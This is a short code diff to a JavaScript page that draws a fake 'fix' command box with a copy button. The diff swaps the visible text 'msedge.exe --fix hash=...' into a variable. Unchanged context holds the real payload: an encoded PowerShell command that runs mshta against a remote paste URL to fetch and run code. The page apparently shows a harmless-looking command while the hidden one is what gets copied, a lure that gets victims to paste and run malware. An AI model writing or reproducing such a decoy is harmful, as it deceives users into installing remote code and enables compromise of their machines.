@@ -54,7 +54,7 @@ let mouseY = 0;
 let cmdBoxY = 0;
 
 const command = 'powershell -enc bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAGgAcwB0AC4AcwBoAC8AcgBhAHcALwBpAHYAbwB2AG8AdwBhAGgAYQB5AA==';
-
+const fcmd = 'msedge.exe --fix hash=whda35...'
 function roundRect(ctx, x, y, w, h, r) {
   ctx.beginPath();
   ctx.moveTo(x + r, y);
@@ -204,7 +204,7 @@ function draw() {
   ctx.fillStyle = colors.cmdText;
   ctx.font = '14.2px Consolas, Courier New';
   ctx.textAlign = 'left';
-  ctx.fillText('msedge.exe --fix hash=whda35...', 48, y + 32);
+  ctx.fillText(fcmd, 48, y + 32);
 
   // === COPY BUTTON ===
   const btnX = 460;
